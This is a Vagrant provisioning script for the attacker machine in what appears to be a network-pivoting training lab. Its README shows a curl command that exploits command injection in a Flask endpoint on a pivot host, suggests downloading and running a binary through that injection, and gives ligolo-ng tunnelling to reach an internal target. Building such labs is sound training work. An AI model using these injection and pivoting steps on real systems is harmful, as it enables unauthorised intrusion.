#!/bin/bash
set -e

export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y --no-install-recommends curl wget gzip netcat-openbsd python3 ca-certificates

cat > /home/vagrant/README.txt <<'EOF'
Attacker VM
------------
This machine is the entry point for the lab.

From here you can access the pivot host at http://192.168.56.20:5000
and tunnel to the target host through pivot using ligolo-ng.

The target host is on a private internal network only reachable from pivot.

To establish the tunnel from this machine (manual steps):
   1. Exploit the command injection on pivot to install and start the ligolo-ng server.
       Example (run via the vulnerable Flask endpoint on pivot):
          curl "http://192.168.56.20:5000/cmd?cmd=/usr/local/bin/ligolo-ng%20server%20--port%208080%20&"
       Note: before starting the server you may need to download the ligolo-ng binary
       to `/usr/local/bin/ligolo-ng` (e.g. using `curl`/`wget` and `chmod +x`). Do this
       via the same command-injection endpoint so it executes on pivot.
   2. Then start the ligolo-ng client on this (attacker) machine to forward the target
       service locally. Example:
          /usr/local/bin/ligolo-ng client 192.168.56.20:8080 5001:192.168.57.30:5000
   3. Access the target:
          curl http://127.0.0.1:5001/login
EOF

chown vagrant:vagrant /home/vagrant/README.txt
